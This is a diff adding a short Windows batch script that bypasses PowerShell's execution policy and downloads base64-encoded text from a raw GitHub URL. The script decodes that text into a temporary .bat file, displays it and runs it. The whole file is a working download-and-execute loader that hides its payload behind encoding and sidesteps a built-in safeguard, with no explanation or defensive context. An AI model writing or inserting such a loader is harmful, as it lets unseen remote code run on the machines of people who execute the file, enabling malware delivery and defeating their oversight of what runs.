@@ -1,1 +1,17 @@
-
+@echo off
+powershell -ExecutionPolicy Bypass -NoProfile -Command ^
+    "$raw = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BenobladeCodes/1001/refs/heads/main/1100') -replace '\r','';" ^
+    "$lines = $raw -split '\n';" ^
+    "if ($lines[0].Trim() -ne '#1100') { Write-Host 'Invalid file format.'; exit }" ^
+    "$b64 = ($lines | Select-Object -Skip 1) -join '';" ^
+    "$b64 = $b64 -replace '[^A-Za-z0-9+/=]','';" ^
+    "try {" ^
+    "    $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64));" ^
+    "    Set-Content -Path '%temp%\decoded.bat' -Value $decoded" ^
+    "} catch {" ^
+    "    Write-Host 'Invalid Base64 content.'; exit" ^
+    "}"
+:: Display and execute the decoded script in the same console
+type "%temp%\decoded.bat"
+echo.
+call "%temp%\decoded.bat"
